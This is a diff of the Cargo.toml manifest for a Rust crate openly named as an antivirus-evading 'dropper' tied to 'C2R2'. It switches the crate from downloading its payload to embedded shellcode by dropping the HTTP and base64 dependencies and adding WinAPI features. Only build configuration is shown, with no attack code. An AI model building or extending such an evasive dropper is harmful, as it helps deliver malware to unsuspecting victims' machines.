@@ -2,7 +2,7 @@
 name = "dropper"
 version = "1.0.0"
 edition = "2021"
-description = "C2R2 Dropper - AV Evasion Module"
+description = "C2R2 Dropper - AV Evasion Module with Embedded Shellcode"
 
 [features]
 default = []
@@ -17,10 +17,6 @@ path = "src/main.rs"
 obfstr = "0.4"
 # Random number generation
 rand = "0.8"
-# HTTP client for downloading
-ureq = { version = "2.9", default-features = false, features = ["tls"] }
-# Base64 encoding
-base64 = "0.22"
 
 [target.'cfg(windows)'.dependencies]
 winapi = { version = "0.3", features = [
@@ -35,7 +31,8 @@ winapi = { version = "0.3", features = [
     "synchapi",
     "sysinfoapi",
     "debugapi",
-    "libloaderapi"
+    "libloaderapi",
+    "winnt"
 ] }
 
 [target.'cfg(windows)'.build-dependencies]
